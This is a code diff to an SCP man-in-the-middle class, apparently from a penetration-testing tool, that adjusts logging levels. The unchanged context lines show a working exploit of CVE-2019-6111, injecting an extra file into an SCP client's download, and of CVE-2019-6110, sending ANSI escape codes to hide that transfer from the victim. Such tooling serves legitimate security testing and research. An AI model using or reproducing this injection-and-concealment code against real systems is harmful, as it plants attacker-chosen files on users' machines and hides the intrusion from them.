@@ -31,7 +31,7 @@ class SCPInjectFile(SCPForwarder):
     def __new__(cls, *args, **kwargs):
         if args[0].scp_command.find(b'-f') != -1:
             return super(SCPInjectFile, cls).__new__(cls)
-        logging.info("SCPClient is not downloading a file, reverting to normal SCPForwarder")
+        logging.debug("SCPClient is not downloading a file, reverting to normal SCPForwarder")
         return SCPForwarder(args[0])
 
     def __init__(self, session) -> None:
@@ -62,7 +62,7 @@ class SCPInjectFile(SCPForwarder):
             self.inject_file_stat.st_size,
             self.args.scp_inject_file.split('/')[-1]
         )
-        logging.info("Sending command %s", command.strip())
+        logging.debug("Sending command %s", command.strip())
         self.session.scp_channel.sendall(command)
         try:
             wait_ok()
@@ -76,12 +76,12 @@ class SCPInjectFile(SCPForwarder):
         send_ok()
         wait_ok()
         self.hide_tracks()
-        logging.info("Successful exploit CVE-2019-6111 over channel %d", self.session.scp_channel.get_id())
+        logging.warning("Successful exploit CVE-2019-6111 over channel %d", self.session.scp_channel.get_id())
 
     def hide_tracks(self):
         # This is CVE-2019-6110: the client will display the text that we send
         # to stderr, even if it contains ANSI escape sequences. We can send
         # ANSI codes that clear the current line to hide the fact that a second
         # file was transmitted..
-        logging.info('Covering our tracks by sending ANSI escape sequence; complete stealth: \\x1b[1A\\x1b[2K')
+        # Covering our tracks by sending ANSI escape sequence; complete stealth: \\x1b[1A\\x1b[2K
         self.session.scp_channel.sendall_stderr("\x1b[1A\x1b[2K".encode('ascii'))
